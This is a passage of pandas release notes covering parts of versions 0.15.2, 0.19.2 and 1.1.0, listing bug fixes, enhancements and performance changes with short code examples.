 1   z    0.260476\n\n    [1 rows x 1 columns]\n\n- Bug in unique of Series with ``category`` dtype, which returned all categories regardless\n  whether they were \"used\" or not (see :issue:`8559` for the discussion).\n  Previous behaviour was to return all categories:\n\n  .. code-block:: ipython\n\n    In [3]: cat = pd.Categorical(['a', 'b', 'a'], categories=['a', 'b', 'c'])\n\n    In [4]: cat\n    Out[4]:\n    [a, b, a]\n    Categories (3, object): [a < b < c]\n\n    In [5]: cat.unique()\n    Out[5]: array(['a', 'b', 'c'], dtype=object)\n\n  Now, only the categories that do effectively occur in the array are returned:\n\n  .. ipython:: python\n\n    cat = pd.Categorical(['a', 'b', 'a'], categories=['a', 'b', 'c'])\n    cat.unique()\n\n- ``Series.all`` and ``Series.any`` now support the ``level`` and ``skipna`` parameters. ``Series.all``, ``Series.any``, ``Index.all``, and ``Index.any`` no longer support the ``out`` and ``keepdims`` parameters, which existed for compatibility with ndarray. Various index types no longer support the ``all`` and ``any`` aggregation functions and will now raise ``TypeError``. (:issue:`8302`).\n\n- Allow equality comparisons of Series with a categorical dtype and object dtype; previously these would raise ``TypeError`` (:issue:`8938`)\n\n- Bug in ``NDFrame``: conflicting attribute/column names now behave consistently between getting and setting. Previously, when both a column and attribute named ``y`` existed, ``data.y`` would return the attribute, while ``data.y = z`` would update the column (:issue:`8994`)\n\n  .. ipython:: python\n\n     data = pd.DataFrame({'x': [1, 2, 3]})\n     data.y = 2\n     data['y'] = [2, 4, 6]\n     data\n\n      this assignment was inconsistent\n     data.y = 5\n\n  Old behavior:\n\n  .. code-block:: ipython\n\n     In [6]: data.y\n     Out[6]: 2\n\n     In [7]: data['y'].values\n     Out[7]: array([5, 5, 5])\n\n  New behavior:\n\n  .. ipython:: python\n\n     data.y\n     data['y'].values\n\n- ``Timestamp('now')`` is now equivalent to ``Timestamp.now()`` in that it returns the local time rather than UTC. Also, ``Timestamp('today')`` is now equivalent to ``Timestamp.today()`` and both have ``tz`` as a possible argument. (:issue:`9000`)\n\n- Fix negative step support for label-based slices (:issue:`8753`)\n\n  Old behavior:\n\n  .. code-block:: ipython\n\n     In [1]: s = pd.Series(np.arange(3), ['a', 'b', 'c'])\n     Out[1]:\n     a    0\n     b    1\n     c    2\n     dtype: int64\n\n     In [2]: s.loc['c':'a':-1]\n     Out[2]:\n     c    2\n     dtype: int64\n\n  New behavior:\n\n  .. ipython:: python\n\n     s = pd.Series(np.arange(3), ['a', 'b', 'c'])\n     s.loc['c':'a':-1]\n\n\n.. _whatsnew_0152.enhancements:\n\nEnhancements\n~~~~~~~~~~~~\n\n``Categorical`` enhancements:\n\n- Added ability to export Categorical data to Stata (:issue:`8633`).  See :ref:`here <io.stata-categorical>` for limitations of categorical variables exported to Stata data files.\n- Added flag ``order_categoricals`` to ``StataReader`` and ``read_stata`` to select whether to order imported categorical data (:issue:`8836`).  See :ref:`here <io.stata-categorical>` for more information on importing categorical variables from Stata data files.\n- Added ability to export Categorical data to/from HDF5 (:issue:`7621`). Queries work the same as if it was an object array. However, the ``category`` dtyped data is stored in a more efficient manner. See :ref:`here <io.hdf5-categorical>` for an example and caveats w.r.t. prior versions of pandas.\n- Added support for ``searchsorted()`` on ``Categorical`` class (:issue:`8420`).\n\nOther enhancements:\n\n- Added the ability to specify the SQL type of columns when writing a DataFrame\n  to a database (:issue:`8778`).\n  For example, specifying to use the sqlalchemy ``String`` type instead of the\n  default ``Text`` type for string columns:\n\n  .. code-block:: python\n\n     from sqlalchemy.types import String\n     data.to_sql('data_dtype', engine, dtype={'Col_1': String})   noqa F821\n\n- ``Series.all`` and ``Series.any`` now support the ``level`` and ``skipna`` parameters (:issue:`8302`):\n\n  .. code-block:: python\n\n     >>> s = pd.Series([False, True, False], index=[0, 0, 1])\n     >>> s.any(level=0)\n     0     True\n     1    False\n     dtype: bool\n\n- ``Panel`` now supports the ``all`` and ``any`` aggregation functions. (:issue:`8302`):\n\n  .. code-block:: python\n\n     >>> p = pd.Panel(np.random.rand(2, 5, 4) > 0.1)\n     >>> p.all()\n            0      1      2     3\n     0   True   True   True  True\n     1   True  False   True  True\n     2   True   True   True  True\n     3  False   True  False  True\n     4   True   True   True  True\n\n- Added support for ``utcfromtimestamp()``, ``fromtimestamp()``, and ``combine()`` on ``Timestamp`` class (:issue:`5351`).\n- Added Google Analytics (`pandas.io.ga`) basic documentation (:issue:`8835`). See `here <https://pandas.pydata.org/pandas-docs/version/0.15.2/remote_data.html#remote-data-ga>`__.\n- ``Timedelta`` arithmetic returns ``NotImplemented`` in unknown cases, allowing extensions by custom classes (:issue:`8813`).\n- ``Timedelta`` now supports arithmetic with ``numpy.ndarray`` objects of the appropriate dtype (numpy 1.8 or newer only) (:issue:`8884`).\n- Added ``Timedelta.to_timedelta64()`` method to the public API (:issue:`8884`).\n- Added ``gbq.generate_bq_schema()`` function to the gbq module (:issue:`8325`).\n- ``Series`` now works with map objects the same way as generators (:issue:`8909`).\n- Added context manager to ``HDFStore`` for automatic closing (:issue:`8791`).\n- ``to_datetime`` gains an ``exact`` keyword to allow for a format to not require an exact match for a provided format string (if its ``False``). ``exact`` defaults to ``True`` (meaning that exact matching is still the default)  (:issue:`8904`)\n- Added ``axvlines`` boolean option to parallel_coordinates plot function, determines whether vertical lines will be printed, default is True\n- Added ability to read table footers to read_html (:issue:`8552`)\n- ``to_sql`` now infers data types of non-NA values for columns that contain NA values and have dtype ``object`` (:issue:`8778`).\n\n\n.. _whatsnew_0152.performance:\n\nPerformance\n~~~~~~~~~~~\n\n- Reduce memory usage when skiprows is an integer in read_csv (:issue:`8681`)\n- Performance boost for ``to_datetime`` conversions with a passed ``format=``, and the ``exact=False`` (:issue:`8904`)\n\n\n.. _whatsnew_0152.bug_fixes:\n\nBug fixes\n~~~~~~~~~\n\n- Bug in concat of Series with ``category`` dtype which were coercing to ``object``. (:issue:`8641`)\n- Bug in Timestamp-Timestamp not returning a Timedelta type and datelike-datelike ops with timezones (:issue:`8865`)\n- Made consistent a timezone mismatch exception (either tz operated with None or incompatible timezone), will now return ``TypeError`` rather than ``ValueError`` (a couple of edge cases only), (:issue:`8865`)\n- Bug in using a ``pd.Grouper(key=...)`` with no level/axis or level only (:issue:`8795`, :issue:`8866`)\n- Report a ``TypeError`` when invalid/no parameters are passed in a groupby (:issue:`8015`)\n- Bug in packaging pandas with ``py2app/cx_Freeze`` (:issue:`8602`, :issue:`8831`)\n- Bug in ``groupby`` signatures that didn't include \\*args or \\*\\*kwargs (:issue:`8733`).\n- ``io.data.Options`` now raises ``RemoteDataError`` when no expiry dates are available from Yahoo and when it receives no data from Yahoo (:issue:`8761`), (:issue:`8783`).\n- Unclear error message in csv parsing when passing dtype and names and the parsed data is a different data type (:issue:`8833`)\n- Bug in slicing a MultiIndex with an empty list and at least one boolean indexer (:issue:`8781`)\n- ``io.data.Options`` now raises ``RemoteDataError`` when no expiry dates are available from Yahoo (:issue:`8761`).\n- ``Timedelta`` kwargs may now be numpy ints and floats (:issue:`8757`).\n- Fixed several outstanding bugs for ``Timedelta`` arithmetic and comparisons (:issue:`8813`, :issue:`5963`, :issue:`5436`).\n- ``sql_schema`` now generates dialect appropriate ``CREATE TABLE`` statements (:issue:`8697`)\n- ``slice`` string method now takes step into account (:issue:`8754`)\n- Bug in ``BlockManager`` where setting values with different type would break block integrity (:issue:`8850`)\n- Bug in ``DatetimeIndex`` when using ``time`` object as key (:issue:`8667`)\n- Bug in ``merge`` where ``how='left'`` and ``sort=False`` would not preserve left frame order (:issue:`7331`)\n- Bug in ``MultiIndex.reindex`` where reindexing at level would not reorder labels (:issue:`4088`)\n- Bug in certain operations with dateutil timezones, manifesting with dateutil 2.3 (:issue:`8639`)\n- Regression in DatetimeIndex iteration with a Fixed/Local offset timezone (:issue:`8890`)\n- Bug in ``to_datetime`` when parsing a nanoseconds using the ``%f`` format (:issue:`8989`)\n- ``io.data.Options`` now raises ``RemoteDataError`` when no expiry dates are available from Yahoo and when it receives no data from Yahoo (:issue:`8761`), (:issue:`8783`).\n- Fix: The font size was only set on x axis if vertical or the y axis if horizontal. (:issue:`8765`)\n- Fixed division by 0 when reading big csv files in python 3 (:issue:`8621`)\n- Bug in outputting a MultiIndex with ``to_html,index=False`` which would add an extra column (:issue:`8452`)\n- Imported categorical variables from Stata files retain the ordinal information in the underlying data (:issue:`8836`).\n- Defined ``.size`` attribute across ``NDFrame`` objects to provide compat with numpy >= 1.9.1; buggy with ``np.array_split`` (:issue:`8846`)\n- Skip testing of histogram plots for matplotlib <= 1.2 (:issue:`8648`).\n- Bug where ``get_data_google`` returned object dtypes (:issue:`3995`)\n- Bug in ``DataFrame.stack(..., dropna=False)`` when the DataFrame's ``columns`` is a ``MultiIndex``\n  whose ``labels`` do not reference all its ``levels``. (:issue:`8844`)\n- Bug in that Option context applied on ``__enter__`` (:issue:`8514`)\n- Bug in resample that causes a ValueError when resampling across multiple days\n  and the last offset is not calculated from the start of the range (:issue:`8683`)\n- Bug where ``DataFrame.plot(kind='scatter')`` fails when checking if an np.array is in the DataFrame (:issue:`8852`)\n- Bug in ``pd.infer_freq/DataFrame.inferred_freq`` that prevented proper sub-daily frequency inference when the index contained DST days (:issue:`8772`).\n- Bug where index name was still used when plotting a series with ``use_index=False`` (:issue:`8558`).\n- Bugs when trying to stack multiple columns, when some (or all) of the level names are numbers (:issue:`8584`).\n- Bug in ``MultiIndex`` where ``__contains__`` returns wrong result if index is not lexically sorted or unique (:issue:`7724`)\n- BUG CSV: fix problem with trailing white space in skipped rows, (:issue:`8679`), (:issue:`8661`), (:issue:`8983`)\n- Regression in ``Timestamp`` does not parse 'Z' zone designator for UTC (:issue:`8771`)\n- Bug in ``StataWriter`` the produces writes strings with 244 characters irrespective of actual size (:issue:`8969`)\n- Fixed ValueError raised by cummin/cummax when datetime64 Series contains NaT. (:issue:`8965`)\n- Bug in DataReader returns object dtype if there are missing values (:issue:`8980`)\n- Bug in plotting if sharex was enabled and index was a timeseries, would show labels on multiple axes (:issue:`3964`).\n- Bug where passing a unit to the TimedeltaIndex constructor applied the to nano-second conversion twice. (:issue:`9011`).\n- Bug in plotting of a period-like array (:issue:`9012`)\n\n\n.. _whatsnew_0.15.2.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v0.15.1..v0.15.2\n\n\n.. _whatsnew_0192:\n\nVersion 0.19.2 (December 24, 2016)\n----------------------------------\n\n{{ header }}\n\n.. ipython:: python\n   :suppress:\n\n   from pandas import *   noqa F401, F403\n\n\nThis is a minor bug-fix release in the 0.19.x series and includes some small regression fixes,\nbug fixes and performance improvements.\nWe recommend that all users upgrade to this version.\n\nHighlights include:\n\n- Compatibility with Python 3.6\n- Added a `Pandas Cheat Sheet <https://github.com/pandas-dev/pandas/tree/main/doc/cheatsheet/Pandas_Cheat_Sheet.pdf>`__. (:issue:`13202`).\n\n\n.. contents:: What's new in v0.19.2\n    :local:\n    :backlinks: none\n\n\n.. _whatsnew_0192.enhancements:\n\nEnhancements\n~~~~~~~~~~~~\n\nThe ``pd.merge_asof()``, added in 0.19.0, gained some improvements:\n\n- ``pd.merge_asof()`` gained ``left_index``/``right_index`` and ``left_by``/``right_by`` arguments (:issue:`14253`)\n- ``pd.merge_asof()`` can take multiple columns in ``by`` parameter and has specialized dtypes for better performance (:issue:`13936`)\n\n\n.. _whatsnew_0192.performance:\n\nPerformance improvements\n~~~~~~~~~~~~~~~~~~~~~~~~\n\n- Performance regression with ``PeriodIndex`` (:issue:`14822`)\n- Performance regression in indexing with getitem (:issue:`14930`)\n- Improved performance of ``.replace()`` (:issue:`12745`)\n- Improved performance ``Series`` creation with a datetime index and dictionary data (:issue:`14894`)\n\n\n.. _whatsnew_0192.bug_fixes:\n\nBug fixes\n~~~~~~~~~\n- Compat with python 3.6 for pickling of some offsets (:issue:`14685`)\n- Compat with python 3.6 for some indexing exception types (:issue:`14684`, :issue:`14689`)\n- Compat with python 3.6 for deprecation warnings in the test suite (:issue:`14681`)\n- Compat with python 3.6 for Timestamp pickles (:issue:`14689`)\n- Compat with ``dateutil==2.6.0``; segfault reported in the testing suite (:issue:`14621`)\n- Allow ``nanoseconds`` in ``Timestamp.replace`` as a kwarg (:issue:`14621`)\n- Bug in ``pd.read_csv`` in which aliasing was being done for ``na_values`` when passed in as a dictionary (:issue:`14203`)\n- Bug in ``pd.read_csv`` in which column indices for a dict-like ``na_values`` were not being respected (:issue:`14203`)\n- Bug in ``pd.read_csv`` where reading files fails, if the number of headers is equal to the number of lines in the file (:issue:`14515`)\n- Bug in ``pd.read_csv`` for the Python engine in which an unhelpful error message was being raised when multi-char delimiters were not being respected with quotes (:issue:`14582`)\n- Fix bugs (:issue:`14734`, :issue:`13654`) in ``pd.read_sas`` and ``pandas.io.sas.sas7bdat.SAS7BDATReader`` that caused problems when reading a SAS file incrementally.\n- Bug in ``pd.read_csv`` for the Python engine in which an unhelpful error message was being raised when ``skipfooter`` was not being respected by Python's CSV library (:issue:`13879`)\n- Bug in ``.fillna()`` in which timezone aware datetime64 values were incorrectly rounded (:issue:`14872`)\n- Bug in ``.groupby(..., sort=True)`` of a non-lexsorted MultiIndex when grouping with multiple levels (:issue:`14776`)\n- Bug in ``pd.cut`` with negative values and a single bin (:issue:`14652`)\n- Bug in ``pd.to_numeric`` where a 0 was not unsigned on a ``downcast='unsigned'`` argument (:issue:`14401`)\n- Bug in plotting regular and irregular timeseries using shared axes\n  (``sharex=True`` or ``ax.twinx()``) (:issue:`13341`, :issue:`14322`).\n- Bug in not propagating exceptions in parsing invalid datetimes, noted in python 3.6 (:issue:`14561`)\n- Bug in resampling a ``DatetimeIndex`` in local TZ, covering a DST change, which would raise ``AmbiguousTimeError`` (:issue:`14682`)\n- Bug in indexing that transformed ``RecursionError`` into ``KeyError`` or ``IndexingError`` (:issue:`14554`)\n- Bug in ``HDFStore`` when writing a ``MultiIndex`` when using ``data_columns=True`` (:issue:`14435`)\n- Bug in ``HDFStore.append()`` when writing a ``Series`` and passing a ``min_itemsize`` argument containing a value for the ``index`` (:issue:`11412`)\n- Bug when writing to a ``HDFStore`` in ``table`` format with a ``min_itemsize`` value for the ``index`` and without asking to append (:issue:`10381`)\n- Bug in ``Series.groupby.nunique()`` raising an ``IndexError`` for an empty ``Series`` (:issue:`12553`)\n- Bug in ``DataFrame.nlargest`` and ``DataFrame.nsmallest`` when the index had duplicate values (:issue:`13412`)\n- Bug in clipboard functions on linux with python2 with unicode and separators (:issue:`13747`)\n- Bug in clipboard functions on Windows 10 and python 3 (:issue:`14362`, :issue:`12807`)\n- Bug in ``.to_clipboard()`` and Excel compat (:issue:`12529`)\n- Bug in ``DataFrame.combine_first()`` for integer columns (:issue:`14687`).\n- Bug in ``pd.read_csv()`` in which the ``dtype`` parameter was not being respected for empty data (:issue:`14712`)\n- Bug in ``pd.read_csv()`` in which the ``nrows`` parameter was not being respected for large input when using the C engine for parsing (:issue:`7626`)\n- Bug in ``pd.merge_asof()`` could not handle timezone-aware DatetimeIndex when a tolerance was specified (:issue:`14844`)\n- Explicit check in ``to_stata`` and ``StataWriter`` for out-of-range values when writing doubles (:issue:`14618`)\n- Bug in ``.plot(kind='kde')`` which did not drop missing values to generate the KDE Plot, instead generating an empty plot. (:issue:`14821`)\n- Bug in ``unstack()`` if called with a list of column(s) as an argument, regardless of the dtypes of all columns, they get coerced to ``object`` (:issue:`11847`)\n\n\n.. _whatsnew_0.19.2.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v0.19.1..v0.19.2\n\n\n.. _whatsnew_110:\n\nWhat's new in 1.1.0 (July 28, 2020)\n-----------------------------------\n\nThese are the changes in pandas 1.1.0. See :ref:`release` for a full changelog\nincluding other versions of pandas.\n\n{{ header }}\n\n.. ---------------------------------------------------------------------------\n\nEnhancements\n~~~~~~~~~~~~\n\n.. _whatsnew_110.specify_missing_labels:\n\nKeyErrors raised by loc specify missing labels\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\nPreviously, if labels were missing for a ``.loc`` call, a KeyError was raised stating that this was no longer supported.\n\nNow the error message also includes a list of the missing labels (max 10 items, display width 80 characters). See :issue:`34272`.\n\n\n.. _whatsnew_110.astype_string:\n\nAll dtypes can now be converted to ``StringDtype``\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nPreviously, declaring or converting to :class:`StringDtype` was in general only possible if the data was already only ``str`` or nan-like (:issue:`31204`).\n:class:`StringDtype` now works in all situations where ``astype(str)`` or ``dtype=str`` work:\n\nFor example, the below now works:\n\n.. ipython:: python\n\n   ser = pd.Series([1, \"abc\", np.nan], dtype=\"string\")\n   ser\n   ser[0]\n   pd.Series([1, 2, np.nan], dtype=\"Int64\").astype(\"string\")\n\n\n.. _whatsnew_110.period_index_partial_string_slicing:\n\nNon-monotonic PeriodIndex partial string slicing\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n:class:`PeriodIndex` now supports partial string slicing for non-monotonic indexes, mirroring :class:`DatetimeIndex` behavior (:issue:`31096`)\n\nFor example:\n\n.. ipython:: python\n\n   dti = pd.date_range(\"2014-01-01\", periods=30, freq=\"30D\")\n   pi = dti.to_period(\"D\")\n   ser_monotonic = pd.Series(np.arange(30), index=pi)\n   shuffler = list(range(0, 30, 2)) + list(range(1, 31, 2))\n   ser = ser_monotonic.iloc[shuffler]\n   ser\n\n.. ipython:: python\n\n   ser[\"2014\"]\n   ser.loc[\"May 2015\"]\n\n\n.. _whatsnew_110.dataframe_or_series_comparing:\n\nComparing two ``DataFrame`` or two ``Series`` and summarizing the differences\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nWe've added :meth:`DataFrame.compare` and :meth:`Series.compare` for comparing two ``DataFrame`` or two ``Series`` (:issue:`30429`)\n\n.. ipython:: python\n\n   df = pd.DataFrame(\n       {\n           \"col1\": [\"a\", \"a\", \"b\", \"b\", \"a\"],\n           \"col2\": [1.0, 2.0, 3.0, np.nan, 5.0],\n           \"col3\": [1.0, 2.0, 3.0, 4.0, 5.0]\n       },\n       columns=[\"col1\", \"col2\", \"col3\"],\n   )\n   df\n\n.. ipython:: python\n\n   df2 = df.copy()\n   df2.loc[0, 'col1'] = 'c'\n   df2.loc[2, 'col3'] = 4.0\n   df2\n\n.. ipython:: python\n\n   df.compare(df2)\n\nSee :ref:`User Guide <merging.compare>` for more details.\n\n\n.. _whatsnew_110.groupby_key:\n\nAllow NA in groupby key\n^^^^^^^^^^^^^^^^^^^^^^^^\n\nWith :ref:`groupby <groupby.dropna>` , we've added a ``dropna`` keyword to :meth:`DataFrame.groupby` and :meth:`Series.groupby` in order to\nallow ``NA`` values in group keys. Users can define ``dropna`` to ``False`` if they want to include\n``NA`` values in groupby keys. The default is set to ``True`` for ``dropna`` to keep backwards\ncompatibility (:issue:`3729`)\n\n.. ipython:: python\n\n    df_list = [[1, 2, 3], [1, None, 4], [2, 1, 3], [1, 2, 2]]\n    df_dropna = pd.DataFrame(df_list, columns=[\"a\", \"b\", \"c\"])\n\n    df_dropna\n\n.. ipython:: python\n\n     Default ``dropna`` is set to True, which will exclude NaNs in keys\n    df_dropna.groupby(by=[\"b\"], dropna=True).sum()\n\n     In order to allow NaN in keys, set ``dropna`` to False\n    df_dropna.groupby(by=[\"b\"], dropna=False).sum()\n\nThe default setting of ``dropna`` argument is ``True`` which means ``NA`` are not included in group keys.\n\n\n.. _whatsnew_110.key_sorting:\n\nSorting with keys\n^^^^^^^^^^^^^^^^^\n\nWe've added a ``key`` argument to the :class:`DataFrame` and :class:`Series` sorting methods, including\n:meth:`DataFrame.sort_values`, :meth:`DataFrame.sort_index`, :meth:`Series.sort_values`,\nand :meth:`Series.sort_index`. The ``key`` can be any callable function which is applied\ncolumn-by-column to each column used for sorting, before sorting is performed (:issue:`27237`).\nSee :ref:`sort_values with keys <basics.sort_value_key>` and :ref:`sort_index with keys\n<basics.sort_index_key>` for more information.\n\n.. ipython:: python\n\n   s = pd.Series(['C', 'a', 'B'])\n   s\n\n.. ipython:: python\n\n   s.sort_values()\n\n\nNote how this is sorted with capital letters first. If we apply the :meth:`Series.str.lower`\nmethod, we get\n\n.. ipython:: python\n\n   s.sort_values(key=lambda x: x.str.lower())\n\n\nWhen applied to a ``DataFrame``, they key is applied per-column to all columns or a subset if\n``by`` is specified, e.g.\n\n.. ipython:: python\n\n   df = pd.DataFrame({'a': ['C', 'C', 'a', 'a', 'B', 'B'],\n                      'b': [1, 2, 3, 4, 5, 6]})\n   df\n\n.. ipython:: python\n\n   df.sort_values(by=['a'], key=lambda col: col.str.lower())\n\n\nFor more details, see examples and documentation in :meth:`DataFrame.sort_values`,\n:meth:`Series.sort_values`, and :meth:`~DataFrame.sort_index`.\n\n.. _whatsnew_110.timestamp_fold_support:\n\nFold argument support in Timestamp constructor\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n:class:`Timestamp:` now supports the keyword-only fold argument according to `PEP 495 <https://www.python.org/dev/peps/pep-0495/#the-fold-attribute>`_ similar to parent ``datetime.datetime`` class. It supports both accepting fold as an initialization argument and inferring fold from other constructor arguments (:issue:`25057`, :issue:`31338`). Support is limited to ``dateutil`` timezones as ``pytz`` doesn't support fold.\n\nFor example:\n\n.. ipython:: python\n\n    ts = pd.Timestamp(\"2019-10-27 01:30:00+00:00\")\n    ts.fold\n\n.. ipython:: python\n\n    ts = pd.Timestamp(year=2019, month=10, day=27, hour=1, minute=30,\n                      tz=\"dateutil/Europe/London\", fold=1)\n    ts\n\nFor more on working with fold, see :ref:`Fold subsection <timeseries.fold>` in the user guide.\n\n.. _whatsnew_110.to_datetime_multiple_tzname_tzoffset_support:\n\nParsing timezone-aware format with different timezones in to_datetime\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n:func:`to_datetime` now supports parsing formats containing timezone names (``%Z``) and UTC offsets (``%z``) from different timezones then converting them to UTC by setting ``utc=True``. This would return a :class:`DatetimeIndex` with timezone at UTC as opposed to an :class:`Index` with ``object`` dtype if ``utc=True`` is not set (:issue:`32792`).\n\nFor example:\n\n.. ipython:: python\n\n    tz_strs = [\"2010-01-01 12:00:00 +0100\", \"2010-01-01 12:00:00 -0100\",\n               \"2010-01-01 12:00:00 +0300\", \"2010-01-01 12:00:00 +0400\"]\n    pd.to_datetime(tz_strs, format='%Y-%m-%d %H:%M:%S %z', utc=True)\n\n.. code-block:: ipython\n\n   In[37]: pd.to_datetime(tz_strs, format='%Y-%m-%d %H:%M:%S %z')\n   Out[37]:\n   Index([2010-01-01 12:00:00+01:00, 2010-01-01 12:00:00-01:00,\n          2010-01-01 12:00:00+03:00, 2010-01-01 12:00:00+04:00],\n         dtype='object')\n\n.. _whatsnew_110.grouper_resample_origin:\n\nGrouper and resample now supports the arguments origin and offset\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n:class:`Grouper` and :meth:`DataFrame.resample` now supports the arguments ``origin`` and ``offset``. It let the user control the timestamp on which to adjust the grouping. (:issue:`31809`)\n\nThe bins of the grouping are adjusted based on the beginning of the day of the time series starting point. This works well with frequencies that are multiples of a day (like ``30D``) or that divides a day (like ``90s`` or ``1min``). But it can create inconsistencies with some frequencies that do not meet this criteria. To change this behavior you can now specify a fixed timestamp with the argument ``origin``.\n\nTwo arguments are now deprecated (more information in the documentation of :meth:`DataFrame.resample`):\n\n- ``base`` should be replaced by ``offset``.\n- ``loffset`` should be replaced by directly adding an offset to the index :class:`DataFrame` after being resampled.\n\nSmall example of the use of ``origin``:\n\n.. ipython:: python\n\n    start, end = '2000-10-01 23:30:00', '2000-10-02 00:30:00'\n    middle = '2000-10-02 00:00:00'\n    rng = pd.date_range(start, end, freq='7min')\n    ts = pd.Series(np.arange(len(rng)) * 3, index=rng)\n    ts\n\nResample with the default behavior ``'start_day'`` (origin is ``2000-10-01 00:00:00``):\n\n.. ipython:: python\n\n    ts.resample('17min').sum()\n    ts.resample('17min', origin='start_day').sum()\n\nResample using a fixed origin:\n\n.. ipython:: python\n\n    ts.resample('17min', origin='epoch').sum()\n    ts.resample('17min', origin='2000-01-01').sum()\n\nIf needed you can adjust the bins with the argument ``offset`` (a :class:`Timedelta`) that would be added to the default ``origin``.\n\nFor a full example, see: :ref:`timeseries.adjust-the-start-of-the-bins`.\n\nfsspec now used for filesystem handling\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nFor reading and writing to filesystems other than local and reading from HTTP(S),\nthe optional dependency ``fsspec`` will be used to dispatch operations (:issue:`33452`).\nThis will give unchanged\nfunctionality for S3 and GCS storage, which were already supported, but also add\nsupport for several other storage implementations such as `Azure Datalake and Blob`_,\nSSH, FTP, dropbox and github. For docs and capabilities, see the `fsspec docs`_.\n\nThe existing capability to interface with S3 and GCS will be unaffected by this\nchange, as ``fsspec`` will still bring in the same packages as before.\n\n.. _Azure Datalake and Blob: https://github.com/fsspec/adlfs\n\n.. _fsspec docs: https://filesystem-spec.readthedocs.io/en/latest/\n\n.. _whatsnew_110.enhancements.other:\n\nOther enhancements\n^^^^^^^^^^^^^^^^^^\n\n- Compatibility with matplotlib 3.3.0 (:issue:`34850`)\n- :meth:`IntegerArray.astype` now supports ``datetime64`` dtype (:issue:`32538`)\n- :class:`IntegerArray` now implements the ``sum`` operation (:issue:`33172`)\n- Added :class:`pandas.errors.InvalidIndexError` (:issue:`34570`).\n- Added :meth:`DataFrame.value_counts` (:issue:`5377`)\n- Added a :func:`pandas.api.indexers.FixedForwardWindowIndexer` class to support forward-looking windows during ``rolling`` operations.\n- Added a :func:`pandas.api.indexers.VariableOffsetWindowIndexer` class to support ``rolling`` operations with non-fixed offsets (:issue:`34994`)\n- :meth:`~DataFrame.describe` now includes a ``datetime_is_numeric`` keyword to control how datetime columns are summarized (:issue:`30164`, :issue:`34798`)\n- :class:`~pandas.io.formats.style.Styler` may now render CSS more efficiently where multiple cells have the same styling (:issue:`30876`)\n- :meth:`~pandas.io.formats.style.Styler.highlight_null` now accepts ``subset`` argument (:issue:`31345`)\n- When writing directly to a sqlite connection :meth:`DataFrame.to_sql` now supports the ``multi`` method (:issue:`29921`)\n- :class:`pandas.errors.OptionError` is now exposed in ``pandas.errors`` (:issue:`27553`)\n- Added :meth:`api.extensions.ExtensionArray.argmax` and :meth:`api.extensions.ExtensionArray.argmin` (:issue:`24382`)\n- :func:`timedelta_range` will now infer a frequency when passed ``start``, ``stop``, and ``periods`` (:issue:`32377`)\n- Positional slicing on a :class:`IntervalIndex` now supports slices with ``step > 1`` (:issue:`31658`)\n- :class:`Series.str` now has a ``fullmatch`` method that matches a regular expression against the entire string in each row of the :class:`Series`, similar to ``re.fullmatch`` (:issue:`32806`).\n- :meth:`DataFrame.sample` will now also allow array-like and BitGenerator objects to be passed to ``random_state`` as seeds (:issue:`32503`)\n- :meth:`Index.union` will now raise ``RuntimeWarning`` for :class:`MultiIndex` objects if the object inside are unsortable. Pass ``sort=False`` to suppress this warning (:issue:`33015`)\n- Added :meth:`Series.dt.isocalendar` and :meth:`DatetimeIndex.isocalendar` that returns a :class:`DataFrame` with year, week, and day calculated according to the ISO 8601 calendar (:issue:`33206`, :issue:`34392`).\n- The :meth:`DataFrame.to_feather` method now supports additional keyword\n  arguments (e.g. to set the compression) that are added in pyarrow 0.17\n  (:issue:`33422`).\n- The :func:`cut` will now accept parameter ``ordered`` with default ``ordered=True``. If ``ordered=False`` and no labels are provided, an error will be raised (:issue:`33141`)\n- :meth:`DataFrame.to_csv`, :meth:`DataFrame.to_pickle`,\n  and :meth:`DataFrame.to_json` now support passing a dict of\n  compression arguments when using the ``gzip`` and ``bz2`` protocols.\n  This can be used to set a custom compression level, e.g.,\n  ``df.to_csv(path, compression={'method': 'gzip', 'compresslevel': 1}``\n  (:issue:`33196`)\n- :meth:`melt` has gained an ``ignore_index`` (default ``True``) argument that, if set to ``False``, prevents the method from dropping the index (:issue:`17440`).\n- :meth:`Series.update` now accepts objects that can be coerced to a :class:`Series`,\n  such as ``dict`` and ``list``, mirroring the behavior of :meth:`DataFrame.update` (:issue:`33215`)\n- :meth:`.DataFrameGroupBy.transform` and :meth:`.DataFrameGroupBy.aggregate` have gained ``engine`` and ``engine_kwargs`` arguments that support executing functions with ``Numba`` (:issue:`32854`, :issue:`33388`)\n- :meth:`.Resampler.interpolate` now supports SciPy interpolation method :class:`scipy.interpolate.CubicSpline` as method ``cubicspline`` (:issue:`33670`)\n- :class:`.DataFrameGroupBy` and :class:`.SeriesGroupBy` now implement the ``sample`` method for doing random sampling within groups (:issue:`31775`)\n- :meth:`DataFrame.to_numpy` now supports the ``na_value`` keyword to control the NA sentinel in the output array (:issue:`33820`)\n- Added :class:`api.extension.ExtensionArray.equals` to the extension array interface, similar to :meth:`Series.equals` (:issue:`27081`)\n- The minimum supported dta version has increased to 105 in :func:`read_stata` and :class:`~pandas.io.stata.StataReader`  (:issue:`26667`).\n- :meth:`~DataFrame.to_stata` supports compression using the ``compression``\n  keyword argument. Compression can either be inferred or explicitly set using a string or a\n  dictionary containing both the method and any additional arguments that are passed to the\n  compression library. Compression was also added to the low-level Stata-file writers\n  :class:`~pandas.io.stata.StataWriter`, :class:`~pandas.io.stata.StataWriter117`,\n  and :class:`~pandas.io.stata.StataWriterUTF8` (:issue:`26599`).\n- :meth:`HDFStore.put` now accepts a ``track_times`` parameter. This parameter is passed to the ``create_table`` 